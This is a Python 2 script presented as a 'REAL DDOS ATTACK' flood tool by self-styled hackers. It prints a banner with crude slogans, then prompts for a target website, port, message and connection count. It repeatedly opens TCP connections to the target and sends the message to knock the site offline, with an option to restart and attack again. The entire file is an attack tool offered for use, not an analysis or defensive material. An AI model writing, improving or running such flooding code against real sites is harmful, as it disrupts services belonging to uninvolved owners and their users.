#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

#+--------------------+
#|Creators :          |
#|-samay              |
#|-vilen              |
#+--------------------+

# Color
B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#


print B+"@@@@@@@@ @@@      @@@@@@@@   @@@@@@@@  @@@@@@@@"
print "@@@@@@@@ @@@     @@@@@@@@@@ @@@@@@@@@@ @@@   @@@@"
print "@@!      @@!     @@!   @@@@ @@!   @@@@ @@!     @@@"
print "!@!      !@!     !@!  @!@!@ !@!  @!@!@ !@!      @!@"
print "@!!!:!   @!!     @!@ @! !@! @!@ @! !@! @!@      !@!"
print "!!!!!:   !!!     !@!!!  !!! !@!!!  !!! !@!      !!!"
print "!!:      !!:     !!:!   !!! !!:!   !!! !!:      !!!"
print ":!:      :!:     :!:    !:! :!:    !:! :!:     !:!"
print ":::      ::::::: :::::::::: :::::::::: ;::    :::"
print ":::      :::::::  ::::::::   ::::::::  :::::::::"+N
print "["+B+""+R+"#"+N+"] "+B+""+R+"CYBOK HACKERS"+N+"   Fl00d 2.0 - "+B+""+R+"REAL DDOS ATTACK"+N
print
print "["+B+""+R+"#"+N+"] "+B+""+R+"CREATED BY SAMAY"+N+"   ANONYMOUS - "+B+""+R+"CEH CERTIFIED"+N
print
print "["+B+""+R+"#"+N+"] "+B+""+R+"HELPED BY VILEN"+N+"   ANONYMOUS - "+B+""+R+"PENETRATION TESTER"+N
print
print "#MAA  - CHOD - DUNGA - SABKI"
print


import time
import socket
import os
import sys
import string

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

print "["+B+""+R+"#"+N+"] "+B+""+R+"DDOS TCP LOADED"+N+" - POWERFUL ATTACK - "+B+""+R+"WEBSITE KI CHUD JAYEGI"+N
host=raw_input( "Site you want to DDoS:" )
port=input( "Port you want to attack:" )
message=raw_input( "Input the message you want to send:" )
conn=input( "How many connections you want to make:" )
ip = socket.gethostbyname( host )
print ("[" + ip + "]")
print ( "[Ip is locked]" )
print ( "[Attacking " + host + "]" )
print ("+----------------------------+")
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("|[Connection Failed]         |")
    print ( "|[ATTACK STARTED SPEEDED BY SAMAY {TO DOWN 20 PEOPLE NEED }]       |")
    ddos.close()
for i in range(1, conn):
    dos()
print ("+----------------------------+")
print("The connections you requested had finished")
if __name__ == "__main__":
    answer = raw_input("Do you want to ddos more?")
    if answer.strip() in "y Y yes Yes YES".split():
        restart_program()
    else:
        os.system(curdir+"\Deq\main.py")
        
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
